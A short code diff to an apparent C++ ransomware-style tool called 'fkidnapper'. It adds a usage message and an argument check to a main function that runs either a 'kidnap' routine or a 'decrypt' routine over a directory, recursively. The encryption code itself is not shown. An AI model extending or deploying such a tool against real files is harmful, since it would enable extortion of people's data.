@@ -108,7 +108,21 @@ void rescue_folder(string path, int depth) {
 
 }
 
+void print_usage() {
+    cout << "USAGE: " << endl
+         << "    fkidnapper <mode> <directory>" << endl
+         << endl
+         << "ARGS:" << endl
+         << "    <mode>          which mode to run, [kidnap or decrypt]" << endl 
+         << "    <directory>     directory to recursively execute" << endl;
+}
+
 int main(int argc, char** argv) {
+    if (argc != 3) {
+        print_usage();
+        return 1;
+    }
+
     string mode = string(argv[1]), folder_name = string(argv[2]);
     if (mode == "kidnap") kidnap_folder(folder_name, 0);    
     else if (mode == "decrypt") rescue_folder(folder_name, 0);
